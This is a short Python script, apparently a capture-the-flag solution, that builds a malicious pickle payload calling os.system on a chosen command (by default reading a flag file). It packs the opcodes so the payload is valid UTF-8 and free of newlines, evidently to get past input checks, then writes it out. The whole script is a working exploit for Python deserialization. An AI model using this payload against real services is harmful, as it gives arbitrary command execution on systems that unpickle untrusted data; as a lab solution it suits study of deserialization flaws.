import struct, pickletools, sys
def X(s): b=s.encode(); return b'X'+struct.pack('<I',len(b))+b
cmd = sys.argv[1] if len(sys.argv)>1 else 'cat /flag-*'
p = X('os')+X('system')+b'q\xc2\x93'+b'('+X(cmd)+b'tR.'
assert b'\n' not in p and b'\r' not in p
s = p.decode('utf-8')   # must be valid UTF-8
assert s.encode()==p
pickletools.dis(p)
open(sys.argv[2] if len(sys.argv)>2 else '/dev/null','wb').write(p+b'\n')
print(repr(p))
